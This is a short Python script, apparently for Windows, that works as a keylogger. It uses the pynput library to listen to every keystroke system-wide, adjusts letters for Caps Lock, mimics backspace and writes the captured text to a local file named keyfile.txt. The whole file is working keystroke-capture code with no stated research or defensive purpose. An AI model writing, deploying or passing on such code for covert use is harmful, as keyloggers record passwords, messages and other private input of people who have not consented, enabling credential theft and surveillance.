from pynput import keyboard
from win32api import GetKeyState
from win32con import VK_CAPITAL


# Check if Caps Lock is on or off
def is_caps_lock():
    return GetKeyState(VK_CAPITAL) == 1


# Handle specific key press transformations
def handle_special_key(key):
    # Define transformations for special keys
    key_mappings = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.caps_lock: "",
        keyboard.Key.shift_r: "",
        keyboard.Key.ctrl_l: "",
    }
    return key_mappings.get(key, "")  # Return the mapped value or an empty string


# Handle key presses
def keyPressed(key):
    log_file = "keyfile.txt"

    with open(log_file, "a+") as logKey:
        try:
            # Handle regular character keys
            char = key.char
            if is_caps_lock() and char.isalpha():  # Handle Caps Lock for letters
                char = char.upper()
            logKey.write(char)
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.backspace:
                # Simulate backspace by removing the last character from the file
                logKey.seek(0)  # Go to the beginning
                content = logKey.read()  # Read the current content
                if content:  # Check if the file is not empty
                    logKey.seek(0)
                    logKey.truncate(0)  # Clear the file
                    logKey.write(content[:-1])  # Remove the last character
            else:
                # Handle other special keys
                special_char = handle_special_key(key)
                logKey.write(special_char)


if __name__ == "__main__":
    # Start the keyboard listener
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
